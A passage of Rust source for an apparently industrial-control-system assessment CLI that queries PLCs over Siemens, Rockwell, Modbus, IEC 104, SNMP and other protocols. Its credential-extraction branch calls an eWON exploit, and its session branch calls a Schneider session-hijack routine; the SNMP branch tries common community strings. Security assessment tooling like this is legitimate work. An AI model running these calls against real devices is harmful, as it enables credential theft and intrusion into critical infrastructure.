                        i.index, i.descr, i.mac, state, i.speed_mbps, i.in_errors, i.out_errors
                    );
                }
            }
            for line in &topo {
                println!("{line}");
            }
            let cves = enumerate::check_cves(&info);
            if !cves.is_empty() {
                println!("\n  CVE / advisory matches:");
                for c in &cves {
                    println!("    [{}] CVSS:{} {}", c.id, c.cvss, c.summary);
                }
            }
            crate::display::print_success("Enumeration complete.");
            Ok(())
        }
        GetNoun::Gi => {
            use casket::vendors::iec104::client;
            let iec_port = if port == 0 { 2404 } else { port };
            let pb = crate::display::spinner_start(&format!("Connecting to IEC 104 at {ip}â€¦"));
            let result = client::connect(ip, iec_port);
            pb.finish_and_clear();
            let mut sess = result?;
            crate::display::print_success("STARTDT confirmed.");
            let objs = client::general_interrogation(&mut sess)?;
            for obj in &objs {
                println!(
                    "  IOA {:>6}: type=0x{:02x} value={}",
                    obj.ioa, obj.type_id, obj.decoded
                );
            }
            if cache {
                let points: Vec<(String, String, String)> = objs
                    .iter()
                    .map(|obj| {
                        (
                            format!("ioa:{}", obj.ioa),
                            format!("IEC104_TYPE_{:02x}", obj.type_id),
                            obj.decoded.clone(),
                        )
                    })
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, data_type, value)| {
                        (address.as_str(), Some(data_type.as_str()), value.as_str())
                    })
                    .collect();
                cache_live_points(ip, protocol, iec_port, &refs)?;
            }
            crate::display::print_success(&format!("{} object(s).", objs.len()));
            Ok(())
        }
        GetNoun::Creds { max_users } => {
            use casket::vendors::ewon::exploit;
            crate::display::print_info(&format!("Extracting credentials from {ip}â€¦"));
            let users = exploit::exploit(ip, port, "adm", max_users);
            if users.is_empty() {
                crate::display::print_warn("No credentials extracted.");
            } else {
                crate::display::print_success(&format!("Extracted {} credential(s).", users.len()));
            }
            Ok(())
        }
        GetNoun::Session => {
            use casket::vendors::schneider::session_hijack;
            let pb = crate::display::spinner_start(&format!("Fetching session from {ip}â€¦"));
            let session = session_hijack::get_session_cookie(ip, port);
            pb.finish_and_clear();
            let Some(session) = session else {
                crate::display::print_error("Failed to get session cookie.");
                return Ok(());
            };
            crate::display::print_success(&format!(
                "Cookie: {} (booted {} times)",
                session.cookie_value, session.power_on_count
            ));
            session_hijack::get_device_info(ip, port, &session.cookie_value, "Administrator");
            Ok(())
        }
    };
    if result.is_ok() && cache {
        cache_live_endpoint(ip, protocol, port, &endpoint_noun)?;
    }
    result
}

#[allow(clippy::too_many_lines)]
fn get_info(ip: &str, port: u16, timeout: u64, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use casket::vendors::siemens::scan;
            let dev = scan::scan_ip_with_port(ip, if port == 0 { 102 } else { port });
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = &dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = &dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = &dev.cpu_state {
                println!("  CPU:      {cs}");
            }
        }
        Some(Protocol::Rockwell) => {
            use casket::vendors::rockwell::driver;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb = crate::display::spinner_start(&format!("Connecting to {ip}â€¦"));
            let result = driver::get_device_info(ip, enip_port);
            pb.finish_and_clear();
            let dev = result?;
            println!("  Vendor:       {}", dev.vendor);
            println!("  Product Type: {}", dev.product_type);
            println!("  Product Code: {}", dev.product_code);
            println!("  Product Name: {}", dev.product_name);
            println!("  Revision:     {}", dev.revision);
            println!("  Serial:       {}", dev.serial);
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_ip = local_ip_for(ip);
            let local_netid = ads::build_local_netid(&local_ip);
            let pb = crate::display::spinner_start(&format!("Discovering {ip}â€¦"));
            let devs = scan::discover_ip_with_port(ip, timeout, false, port).unwrap_or_default();
            pb.finish_and_clear();
            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("No Beckhoff device found.");
                return Ok(());
            };
            let pb2 = crate::display::spinner_start("Reading full device infoâ€¦");
            let result = scan::get_device_info_full(&dev, &local_netid, port);
            pb2.finish_and_clear();
            match result {
                Some(info) => {
                    println!("  Name:    {}", info.name);
                    println!("  NetID:   {}", info.netid);
                    if let Some(os) = &info.os_name {
                        println!("  OS:      {os}");
                    }
                    println!("  TwinCAT: {}", info.tc_version);
                }
                None => crate::display::print_warn("Could not retrieve full device info."),
            }
        }
        Some(Protocol::Omron) => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            let pb = crate::display::spinner_start(&format!("Querying Omron FINS at {ip}â€¦"));
            let result = fins::get_device_info_tcp(ip, fins_port);
            pb.finish_and_clear();
            let dev = result?;
            println!("  Model:   {}", dev.model);
            println!("  Version: {}", dev.version);
            println!("  Node:    0x{:02x}", dev.node_addr);
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Querying {ip}â€¦"));
            // The CLI formats the returned identity itself.  Keep the library
            // helper silent so `get info` does not print every field twice.
            let result = control::get_device_info(ip, port, true);
            pb.finish_and_clear();
            let info = result?;
            println!("  PLC Type: {}", info.plc_type);
            if let Some(fw) = info.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(b) = info.build {
                println!("  Build:    {b}");
            }
        }
        Some(Protocol::Bacnet) => {
            use casket::vendors::bacnet::client;
            let bacnet_port = if port == 0 { client::BACNET_PORT } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Querying BACnet/IP at {ip}:{bacnet_port}â€¦"
            ));
            let dev = client::scan_ip_with_port(ip, bacnet_port, timeout);
            pb.finish_and_clear();
            let Some(d) = dev else {
                crate::display::print_error("No BACnet device found.");
                return Ok(());
            };
            println!("  Instance:  {}", d.instance_id);
            println!("  Vendor ID: {}", d.vendor_id);
            println!("  Max APDU:  {}", d.max_apdu);
            println!("  Name:      {}", d.object_name);
            if !d.vendor_name.is_empty() {
                println!("  Vendor:    {}", d.vendor_name);
            }
            if !d.description.is_empty() {
                println!("  Desc:      {}", d.description);
            }
            if !d.firmware_revision.is_empty() {
                println!("  Firmware:  {}", d.firmware_revision);
            }
        }
        Some(Protocol::Dnp3) => {
            use casket::vendors::dnp3::client;
            use std::time::Duration;
            let pb = crate::display::spinner_start(&format!("Querying DNP3 at {ip}â€¦"));
            let dnp3_port = if port == 0 { 20_000 } else { port };
            let dev = client::detect_with_port(ip, dnp3_port, Duration::from_secs(timeout));
            pb.finish_and_clear();
            let Some(d) = dev else {
                crate::display::print_error("No DNP3 outstation found.");
                return Ok(());
            };
            println!("  Outstation: 0x{:04x}", d.outstation_addr);
            for (k, v) in &d.device_attributes {
                println!("  {k}: {v}");
            }
        }
        Some(Protocol::OpcUa) => {
            use casket::vendors::opcua::client;
            use std::time::Duration;
            let opcua_port = if port == 0 { 4840 } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Querying OPC-UA server at {ip}:{opcua_port}â€¦"
            ));
            let dev = client::detect(ip, opcua_port, Duration::from_secs(timeout));
            pb.finish_and_clear();
            let Some(d) = dev else {
                crate::display::print_error("No OPC-UA server found.");
                return Ok(());
            };
            println!("  Application: {}", d.application_name);
            if !d.application_uri.is_empty() {
                println!("  URI:         {}", d.application_uri);
            }
            if !d.product_uri.is_empty() {
                println!("  Product URI: {}", d.product_uri);
            }
            println!("  Endpoints:   {}", d.endpoints.len());
        }
        Some(Protocol::Iec104) => {
            use casket::vendors::iec104::client;
            let iec_port = if port == 0 { client::IEC104_PORT } else { port };
            let pb = crate::display::spinner_start(&format!(
                "Querying IEC 60870-5-104 at {ip}:{iec_port}â€¦"
            ));
            let session = client::connect(ip, iec_port);
            pb.finish_and_clear();
            let mut session = match session {
                Ok(s) => s,
                Err(e) => {
                    crate::display::print_error(&format!("IEC 104 connection failed: {e}"));
                    return Ok(());
                }
            };
            match client::general_interrogation(&mut session) {
                Ok(objs) => {
                    println!("  Port:    {iec_port}");
                    println!("  Objects: {}", objs.len());
                    for obj in objs.iter().take(5) {
                        println!("  IOA {:>6}: {}", obj.ioa, obj.decoded);
                    }
                    if objs.len() > 5 {
                        println!("  â€¦ and {} more", objs.len() - 5);
                    }
                }
                Err(e) => {
                    crate::display::print_error(&format!("General interrogation failed: {e}"));
                }
            }
        }
        Some(Protocol::Modbus) => {
            use casket::vendors::schneider::scan::{self, Transport};
            let pb = crate::display::spinner_start(&format!("Querying Modbus TCP at {ip}â€¦"));
            let devs = scan::scan_ip_with_transport(ip, timeout, false, port, Transport::Tcp)?;
            pb.finish_and_clear();
            if devs.is_empty() {
                crate::display::print_error("No Modbus TCP device responded.");
            } else {
                for d in &devs {
                    if let Some(name) = &d.name {
                        println!("  Name:     {name}");
                    }
                    if let Some(fw) = &d.firmware {
                        println!("  Firmware: {fw}");
                    }
                    if let Some(uid) = d.modbus_unit_id {
                        println!("  Unit ID:  {uid}");
                    }
                }
            }
        }
        Some(Protocol::Ewon) => {
            use casket::vendors::ewon::scan;
            let pb = crate::display::spinner_start(&format!("Scanning eWON at {ip}â€¦"));
            let devs = scan::scan_ip(ip, timeout, false).unwrap_or_default();
            pb.finish_and_clear();
            if devs.is_empty() {
                crate::display::print_error("No eWON device responded.");
            } else {
                for dev in &devs {
                    if let Some(ip_addr) = &dev.ip {
                        println!("  IP:           {ip_addr}");
                    }
                    if let Some(mac) = &dev.mac {
                        println!("  MAC:          {mac}");
                    }
                    if let Some(serial) = &dev.serial {
                        println!("  Serial:       {serial}");
                    }
                    if let Some(fw) = &dev.firmware {
                        println!("  Firmware:     {fw}");
                    }
                    if let Some(pc) = &dev.product_code {
                        println!("  Product code: {pc}");
                    }
                    if let Some(id) = &dev.identifier {
                        println!("  Identifier:   {id}");
                    }
                }
                crate::display::print_success(&format!("{} eWON device(s).", devs.len()));
            }
        }
        Some(Protocol::Mqtt) => {
            use casket::vendors::mqtt::client;
            let mqtt_port = if port == 0 { client::MQTT_PORT } else { port };
            let pb =
                crate::display::spinner_start(&format!("Probing MQTT broker at {ip}:{mqtt_port}â€¦"));
            let result = client::probe(ip, mqtt_port);
            pb.finish_and_clear();
            match result {
                None => crate::display::print_warn("No MQTT broker response."),
                Some(dev) => {
                    println!("  Anonymous:   {}", dev.anonymous);
                    if let Some(info) = &dev.broker_info {
                        println!("  Broker info: {info}");
                    }
                    println!("  Sparkplug B: {}", dev.sparkplug);
                    crate::display::print_success("MQTT broker responded.");
                }
            }
        }
        Some(Protocol::Enip) => {
            use casket::vendors::enip::scan;
            let pb = crate::display::spinner_start(&format!("Querying EtherNet/IP at {ip}â€¦"));
            let devs = scan::scan_ip(ip, timeout, false).unwrap_or_default();
            pb.finish_and_clear();
            if devs.is_empty() {
                crate::display::print_error("No EtherNet/IP device responded.");
            } else {
                for d in &devs {
                    println!("  Product:  {}", d.product_name);
                    println!("  Vendor:   {}", d.vendor_id);
                    println!("  Revision: {}", d.revision);
                }
            }
        }
        Some(Protocol::Schneider) => {
            use casket::vendors::schneider::scan::{self, Transport};
            let pb = crate::display::spinner_start(&format!("Querying Schneider device at {ip}â€¦"));
            let devs = scan::scan_ip_with_transport(ip, timeout, false, port, Transport::Both)
                .unwrap_or_default();
            pb.finish_and_clear();
            if devs.is_empty() {
                crate::display::print_error("No Schneider device responded.");
            } else {
                for d in &devs {
                    if let Some(name) = &d.name {
                        println!("  Name:     {name}");
                    }
                    if let Some(fw) = &d.firmware {
                        println!("  Firmware: {fw}");
                    }
                    if let Some(proto) = &d.protocol {
                        println!("  Protocol: {proto}");
                    }
                    if let Some(uid) = d.modbus_unit_id {
                        println!("  Unit ID:  {uid}");
                    }
                }
            }
        }
        Some(Protocol::Mitsubishi) => {
            use casket::vendors::mitsubishi::scan::{self, Transport};
            let pb = crate::display::spinner_start(&format!("Querying Mitsubishi MELSEC at {ip}â€¦"));
            let devs = scan::scan_ip_with_transport(ip, timeout, false, port, Transport::Both)
                .unwrap_or_default();
            pb.finish_and_clear();
            if devs.is_empty() {
                crate::display::print_error("No Mitsubishi device responded.");
            } else {
                for d in &devs {
                    println!("  PLC Type: {}", d.plc_type);
                    if let Some(title) = &d.title {
                        println!("  Title:    {title}");
                    }
                    if let Some(comment) = &d.comment {
                        println!("  Comment:  {comment}");
                    }
                    if let Some(proto) = &d.protocol {
                        println!("  Protocol: {proto}");
                    }
                }
            }
        }
        Some(Protocol::Snmp) => {
            use casket::vendors::snmp::{client, oids};
            let snmp_port = if port == 0 { 161 } else { port };
            let pb = crate::display::spinner_start(&format!("Querying SNMP at {ip}:{snmp_port}â€¦"));
            let mut found = Vec::new();
            for &c in oids::COMMON_COMMUNITIES {
                if let Ok(val) = client::get(ip, snmp_port, c, oids::SYS_DESCR) {
                    found.push((c, val.display()));
                }
            }
            pb.finish_and_clear();
            if found.is_empty() {
                crate::display::print_error("No SNMP community strings responded.");
            } else {
                for (c, descr) in &found {
                    println!("  community={c:<12}  sysDescr={descr}");
                }
            }
        }
        None => bail!("'--protocol <PROTO>' required for 'get info'"),
    }
    Ok(())
}

fn get_state(ip: &str, port: u16, timeout: u64, proto: Option<Protocol>) -> Result<()> {
    match proto {
        Some(Protocol::Siemens) => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            let state = s7comm::get_cpu_state(ip, s7_port, timeout, None);
            crate::display::print_info(&format!("CPU state: {state}"));
        }
        Some(Protocol::Omron) => {
            use casket::vendors::omron::fins;
            let fins_port = if port == 0 { 9600 } else { port };
            match fins::get_cpu_state(ip, fins_port, 0) {
                Ok(state) => crate::display::print_success(&format!("CPU state: {state}")),
                Err(e) => crate::display::print_error(&format!("omron {ip}:{fins_port}: {e}")),
            }
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::scan;
            let devs = scan::discover_ip_with_port(ip, timeout, true, port)?;
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device found.");
            };
            let local_netid = casket::vendors::beckhoff::ads::build_local_netid(&local_ip_for(ip));
            let state = scan::get_state(&dev, &local_netid, port);
            if state == "ERROR" {
                bail!("beckhoff {ip}:{port}: could not read TwinCAT state.");
            }
            crate::display::print_success(&format!("TwinCAT state: {state}"));
        }
        Some(Protocol::Mitsubishi) => {
            use casket::vendors::mitsubishi::scan::{self, Transport};
            let slmp_port = if port == 0 { 5006 } else { port };
            let pb = crate::display::spinner_start(&format!("Probing Mitsubishi MELSEC at {ip}â€¦"));
            let devs = scan::scan_ip_with_transport(ip, 5, true, slmp_port, Transport::Both)
                .unwrap_or_default();
            pb.finish_and_clear();
            if let Some(dev) = devs.into_iter().next() {
                println!("  PLC type: {}", dev.plc_type);
                if let Some(t) = dev.title {
                    println!("  Title:    {t}");
                }
                crate::display::print_warn(
                    "CPU run/stop state is not readable via SLMP discovery.",
                );
            } else {
                crate::display::print_error("No Mitsubishi MELSEC device responded.");
            }
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::control;
            let pb = crate::display::spinner_start(&format!("Probing Phoenix Contact at {ip}â€¦"));
            let result = control::get_device_info(ip, port, true);
            pb.finish_and_clear();
            match result {
                Ok(dev) => {
                    println!("  PLC type: {}", dev.plc_type);
                    if let Some(fw) = dev.firmware {
                        println!("  Firmware: {fw}");
                    }
                    crate::display::print_warn(
                        "CPU run/stop state requires a control handshake; use 'set state'.",
                    );
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }
        Some(p) => bail!("{p:?} does not support 'get state'"),
        None => bail!("'--protocol <PROTO>' required for 'get state'"),
    }
    Ok(())
}

fn get_io(ip: &str, port: u16, timeout: u64, password: Option<&str>) -> Result<()> {
    use casket::vendors::siemens::s7comm;
    let s7_port = if port == 0 { 102 } else { port };
    let pb = crate::display::spinner_start(&format!("Reading I/O from {ip}â€¦"));
    let data = s7comm::read_all_data(ip, s7_port, timeout, password);
    pb.finish_and_clear();
    let mut any = false;
    for area in &["inputs", "outputs", "merkers"] {
        if let Some(Some(bits)) = data.get(*area) {
            any = true;
            println!("  {area}:");
            let mut keys: Vec<&String> = bits.keys().collect();
            keys.sort();
            for bit in keys {
                println!("    {bit}: {}", bits[bit]);
            }
        }
    }
    if !any {
        bail!("No S7 I/O data received from {ip}:{s7_port}");
    }
    Ok(())
}

#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
fn get_tags(
    ip: &str,
    port: u16,
    timeout: u64,
    proto: Option<Protocol>,
    values: bool,
    all: bool,
    username: Option<String>,
    password: Option<String>,
    cache: bool,
) -> Result<()> {
    const COMPACT_TAG_LIMIT: usize = 25;
    let tag_limit = |total: usize| {
        if all {
            total
        } else {
            total.min(COMPACT_TAG_LIMIT)
        }
    };
    let print_hidden = |total: usize, shown: usize| {
        if !all && total > shown {
            crate::display::print_info(&format!(
                "{} additional item(s) hidden; use --all to list them.",
                total - shown
            ));
        }
    };
    match proto {
        Some(Protocol::Rockwell) => {
            use casket::vendors::rockwell::driver;
            use std::collections::{HashMap, HashSet};

            const VALUE_SAMPLE_LIMIT: usize = 25;
            const ARRAY_PREVIEW_LIMIT: usize = 8;
            let enip_port = if port == 0 { 44818 } else { port };
            let pb = crate::display::spinner_start(&format!("Enumerating tags on {ip}â€¦"));
            let result = driver::enumerate_tags(ip, enip_port);
            pb.finish_and_clear();
            let tags = result?;
            let limit = tag_limit(tags.len());
            // Match the TUI's useful representation: scalar UDTs are a parent
            // symbol plus individually addressable, decoded member leaves.  Keep
            // the network work bounded to the roots being displayed unless the
            // caller explicitly asks for the complete catalogue with `--all`.
            let visible_struct_names: Vec<&str> = tags
                .iter()
                .take(limit)
                .filter(|tag| driver::is_struct_like(tag.tag_type) && tag.dimensions == 0)
                .map(|tag| tag.name.as_str())
                .collect();
            // A tag list is useful only when its scalar root values are visible.
            // Keep the request bounded while still giving the compact listing
            // the same immediate context as the UDT member leaves below.
            let sampled = &tags[..tags.len().min(VALUE_SAMPLE_LIMIT)];
            let templates = if sampled.is_empty() && visible_struct_names.is_empty() {
                None
            } else {
                // Templates are downloaded only for UDT types, so passing the
                // catalogue does not turn this into one request per atomic tag.
                Some(driver::enumerate_templates(ip, enip_port, &tags))
            };
            let read_names: Vec<String> = sampled
                .iter()
                .map(|tag| {
                    if tag.dimensions > 0 {
                        format!("{}[0]", tag.name)
                    } else {
                        tag.name.clone()
                    }
                })
                .collect();
            let read_refs: Vec<&str> = read_names.iter().map(String::as_str).collect();
            let raw_values = driver::read_tags_bulk(ip, enip_port, &read_refs);
            let mut values_by_name = HashMap::<&str, String>::new();
            let mut array_elements_by_name = HashMap::<&str, Vec<(usize, u16, String)>>::new();
            let mut active_array_tags = Vec::new();
            for (tag, raw) in sampled.iter().zip(raw_values.iter()) {
                let name = tag.name.as_str();
                if tag.dimensions == 1 && !driver::is_struct_like(tag.tag_type) {
                    if let Some(payload) = raw.as_deref() {
                        let element_type = payload
                            .get(..2)
                            .and_then(|bytes| <[u8; 2]>::try_from(bytes).ok())
                            .map_or(tag.tag_type & !0x6000, u16::from_le_bytes);
                        let value = driver::decode_value(element_type, payload, templates.as_ref());
                        array_elements_by_name
                            .entry(name)
                            .or_default()
                            .push((0, element_type, value));
                        active_array_tags.push(tag);
                        values_by_name.insert(name, "[0]=â€¦".into());
                    } else {
                        values_by_name.insert(name, "unavailable".into());
                    }
                    continue;
                }

                let value = raw.as_deref().map_or_else(
                    || "unavailable".to_string(),
                    |payload| {
                        let decoded = driver::decode_value(tag.tag_type, payload, templates.as_ref());
                        if tag.dimensions > 0 {
                            format!("[{decoded}, â€¦]")
                        } else {
                            decoded
                        }
                    },
                );
                values_by_name.insert(name, value);
            }

            // Logix symbol metadata reports an array's rank, not its bounds. Read
            // one-dimensional atomic elements in order and stop at the first
            // missing index, with an eight-element cap to keep an inventory read
            // bounded on real controllers.
            let mut capped_array_previews = HashSet::<&str>::new();
            for index in 1..ARRAY_PREVIEW_LIMIT {
                if active_array_tags.is_empty() {
                    break;
                }
                let element_names: Vec<String> = active_array_tags
                    .iter()
                    .map(|tag| format!("{}[{index}]", tag.name))
                    .collect();
                let element_refs: Vec<&str> = element_names.iter().map(String::as_str).collect();
                let element_raw = driver::read_tags_bulk(ip, enip_port, &element_refs);
                let mut next_active = Vec::new();
                for (tag, raw) in active_array_tags.iter().copied().zip(element_raw.iter()) {
                    let Some(payload) = raw.as_deref() else {
                        continue;
                    };
                    let element_type = payload
                        .get(..2)
                        .and_then(|bytes| <[u8; 2]>::try_from(bytes).ok())
                        .map_or(tag.tag_type & !0x6000, u16::from_le_bytes);
                    let value = driver::decode_value(element_type, payload, templates.as_ref());
                    array_elements_by_name
                        .entry(tag.name.as_str())
                        .or_default()
                        .push((index, element_type, value));
                    next_active.push(tag);
                }
                if index + 1 == ARRAY_PREVIEW_LIMIT {
                    for tag in &next_active {
                        capped_array_previews.insert(tag.name.as_str());
                    }
                }
                active_array_tags = next_active;
            }
            for (name, elements) in &array_elements_by_name {
                let mut preview = elements
                    .iter()
                    .map(|(index, _, value)| format!("[{index}]={value}"))
                    .collect::<Vec<_>>()
                    .join(", ");
                if capped_array_previews.contains(name) {
                    preview.push_str(", â€¦");
                }
                values_by_name.insert(*name, preview);
            }
            let struct_raw = driver::read_tags_bulk(ip, enip_port, &visible_struct_names);
            let struct_leaves_by_name: HashMap<&str, Vec<driver::StructLeaf>> =
                visible_struct_names
                    .iter()
                    .zip(struct_raw.iter())
                    .filter_map(|(name, raw)| {
                        raw.as_deref().map(|payload| {
                            let tag_type = tags
                                .iter()
                                .find(|tag| tag.name == **name)
                                .map_or(0, |tag| tag.tag_type);
                            (
                                *name,
                                driver::flatten_struct(
                                    driver::struct_body(payload),
                                    tag_type & 0x0FFF,
                                    templates.as_ref(),
                                ),
                            )
                        })
                    })
                    .collect();

            if cache {
                let db = crate::db::Database::open(&crate::db::Database::default_path())?;
                let metadata: Vec<(i64, &str, i64)> = tags
                    .iter()
                    .map(|tag| {
                        (
                            i64::from(tag.instance_id),
                            tag.name.as_str(),
                            i64::from(tag.tag_type),
                        )
                    })
                    .collect();
                db.upsert_tags_for_protocol(ip, "rockwell", &metadata)?;
                let mut points: Vec<(String, String, String)> = sampled
                    .iter()
                    .map(|tag| {
                        let value = values_by_name
                            .get(tag.name.as_str())
                            .cloned()
                            .unwrap_or_else(|| "unavailable".into());
                        (
                            format!("tag:{}", tag.name),
                            driver::type_name(tag.tag_type),
                            value,
                        )
                    })
                    .collect();
                let leaf_points: Vec<(String, String, String)> = struct_leaves_by_name
                    .iter()
                    .flat_map(|(parent, leaves)| {
                        leaves.iter().map(move |leaf| {
                            (
                                format!("tag:{parent}.{}", leaf.path),
                                driver::type_name(leaf.cip_type),
                                leaf.value.clone(),
                            )
                        })
                    })
                    .collect();
                let array_points: Vec<(String, String, String)> = array_elements_by_name
                    .iter()
                    .flat_map(|(parent, elements)| {
                        elements.iter().map(move |(index, cip_type, value)| {
                            (
                                format!("tag:{parent}[{index}]"),
                                driver::type_name(*cip_type),
                                value.clone(),
                            )
                        })
                    })
                    .collect();
                // `upsert_data_points` treats its argument as a complete
                // protocol snapshot.  Save roots, UDT leaves, and array elements
                // together so one category never removes another from the cache.
                points.extend(leaf_points);
                points.extend(array_points);
                let point_refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, data_type, value)| {
                        (address.as_str(), Some(data_type.as_str()), value.as_str())
                    })
                    .collect();
                db.upsert_data_points(ip, "rockwell", &point_refs)?;
                // Persist fully enumerated UDT paths and array elements so a later
                // cached CLI/TUI view retains their true addressability.
                if all || tags.len() <= limit {
                    let members: Vec<(String, bool)> = struct_leaves_by_name
                        .iter()
                        .flat_map(|(parent, leaves)| {
                            leaves
                                .iter()
                                .map(move |leaf| (format!("{parent}.{}", leaf.path), leaf.writable))
                        })
                        .chain(array_elements_by_name.iter().flat_map(|(parent, elements)| {
                            elements.iter().map(move |(index, cip_type, _)| {
                                (
                                    format!("{parent}[{index}]"),
                                    driver::is_writable_type(*cip_type),
                                )
                            })
                        }))
                        .collect();
                    if !members.is_empty() {
                        let member_refs: Vec<(&str, bool)> = members
                            .iter()
                            .map(|(path, writable)| (path.as_str(), *writable))
                            .collect();
                        db.upsert_members_for_protocol(ip, "rockwell", &member_refs)?;
                    }
                }
                let fields = serde_json::json!({"port": enip_port, "enip_port": enip_port});
                let _ = cache_scan_observation(ip, "rockwell", enip_port, &fields);
            }

            println!(
                "  {:>5}  {:<32}  {:<18}  {:<4}  {:<24}  Access",
                "ID", "Name", "Type", "Dims", "Value"
            );
            println!("  {}", "â”€".repeat(102));
            let mut expanded_leaf_count = 0usize;
            for tag in tags.iter().take(limit) {
                let (_, dims) = driver::type_parts(tag.tag_type);
                let value = if struct_leaves_by_name.contains_key(tag.name.as_str()) {
                    "expanded below"
                } else {
                    values_by_name
                        .get(tag.name.as_str())
                        .map_or("â€”", String::as_str)
                };
                let value = ellipsize(value, 24);
                let rendered_value = if matches!(value.as_str(), "â€”" | "unavailable") {
                    crate::display::raw(&pad_to_width(&value, 24))
                } else {
                    crate::display::decoded_value(&pad_to_width(&value, 24))
                };
                let indexed_writable = tag.dimensions == 1
                    && !driver::is_struct_like(tag.tag_type)
                    && driver::is_writable_type(tag.tag_type & !0x6000);
                let access = if indexed_writable {
                    crate::display::text("IDX RW")
                } else {
                    crate::display::access(driver::is_writable_type(tag.tag_type))
                };
                println!(
                    "  {:>5}  {}  {}  {}  {}  {}",
                    tag.instance_id,
                    crate::display::tag_name(&pad_to_width(&tag.name, 32)),
                    crate::display::type_name(&pad_to_width(
                        &driver::type_name(tag.tag_type),
                        18
                    )),
                    crate::display::numeric(&pad_to_width(dims, 4)),
                    rendered_value,
                    access,
                );
                if let Some(leaves) = struct_leaves_by_name.get(tag.name.as_str()) {
                    for leaf in leaves {
                        let path = format!("{}.{}", tag.name, leaf.path);
                        let indented_path = format!("â†³ {path}");
                        let leaf_type = driver::type_name(leaf.cip_type);
                        println!(
                            "  {:>5}  {}  {}  {}  {}  {}",
                            "",
                            crate::display::tag_name(&pad_to_width(&indented_path, 32)),
                            crate::display::type_name(&pad_to_width(&leaf_type, 18)),
                            crate::display::numeric(&pad_to_width("", 4)),
                            crate::display::decoded_value(&pad_to_width(
                                &ellipsize(&leaf.value, 24),
                                24
                            )),
                            crate::display::access(leaf.writable),
                        );
                        expanded_leaf_count += 1;
                    }
                }
            }
            print_hidden(tags.len(), limit);
            if tags.len() > VALUE_SAMPLE_LIMIT {
                crate::display::print_warn(&format!(
                    "Decoded values shown for the first {VALUE_SAMPLE_LIMIT} tags only; {} additional tag(s) were listed without live reads.",
                    tags.len() - VALUE_SAMPLE_LIMIT
                ));
            }
            if expanded_leaf_count > 0 {
                crate::display::print_info(&format!(
                    "{expanded_leaf_count} UDT member leaf/leaves expanded from live template metadata."
                ));
            }
            crate::display::print_success(&format!("{} tag(s) found.", tags.len()));
        }
        Some(Protocol::Beckhoff) => {
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let devs = scan::discover_ip_with_port(ip, timeout, true, port)?;
            let Some(dev) = devs.into_iter().next() else {
                bail!("No Beckhoff device found.");
            };
            let syms = scan::enumerate_symbols(&dev, &local_netid, port);
            if syms.is_empty() {
                bail!("No Beckhoff symbols returned.");
            }
            let limit = tag_limit(syms.len());
            for sym in syms.iter().take(limit) {
                if values {
                    let value = sym.value_str.as_deref().unwrap_or("unavailable");
                    println!(
                        "  {}  {}  {}",
                        crate::display::tag_name(&pad_to_width(&sym.name, 32)),
                        crate::display::type_name(&pad_to_width(&sym.type_name, 18)),
                        crate::display::decoded_value(&ellipsize(value, 32)),
                    );
                } else {
                    println!(
                        "  {}  {}",
                        crate::display::tag_name(&pad_to_width(&sym.name, 32)),
                        crate::display::type_name(&sym.type_name),
                    );
                }
            }
            if cache {
                let points: Vec<(String, String, String)> = syms
                    .iter()
                    .map(|sym| {
                        (
                            format!("tag:{}", sym.name),
                            sym.type_name.clone(),
                            sym.value_str
                                .clone()
                                .unwrap_or_else(|| "unavailable".into()),
                        )
                    })
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, data_type, value)| {
                        (address.as_str(), Some(data_type.as_str()), value.as_str())
                    })
                    .collect();
                cache_live_points(ip, Protocol::Beckhoff, port, &refs)?;
            }
            print_hidden(syms.len(), limit);
            crate::display::print_success(&format!("{} symbol(s).", syms.len()));
        }
        Some(Protocol::Phoenix) => {
            use casket::vendors::phoenix::webvisit;
            let (project, tags) = webvisit::get_tags(ip, port)?;
            let values = webvisit::read_tag_values(ip, port, &tags)?;
            println!("  Project: {}", crate::display::text(&project));
            let limit = tag_limit(values.len());
            for (name, val) in values.iter().take(limit) {
                println!(
                    "  {}: {}",
                    crate::display::tag_name(name),
                    crate::display::decoded_value(val)
                );
            }
            if cache {
                let points: Vec<(String, String)> = values
                    .iter()
                    .map(|(name, value)| (format!("tag:{name}"), value.clone()))
                    .collect();
                let refs: Vec<(&str, Option<&str>, &str)> = points
                    .iter()
                    .map(|(address, value)| (address.as_str(), Some("webvisit"), value.as_str()))
                    .collect();
                cache_live_points(ip, Protocol::Phoenix, port, &refs)?;
            }
            print_hidden(values.len(), limit);
            crate::display::print_success(&format!("{} tag(s).", tags.len()));
        }
        Some(Protocol::Iec104) => get_tags_iec104(ip, port, cache)?,
        Some(Protocol::Ewon) => {
            get_tags_ewon(ip, port, username.as_deref(), password.as_deref(), cache)?;
        }
        Some(Protocol::Mqtt) => get_tags_mqtt(ip, port, timeout, username, password, cache)?,
        Some(Protocol::Siemens) => {
            use casket::vendors::siemens::s7comm;
            let s7_port = if port == 0 { 102 } else { port };
            crate::display::print_info(&format!(
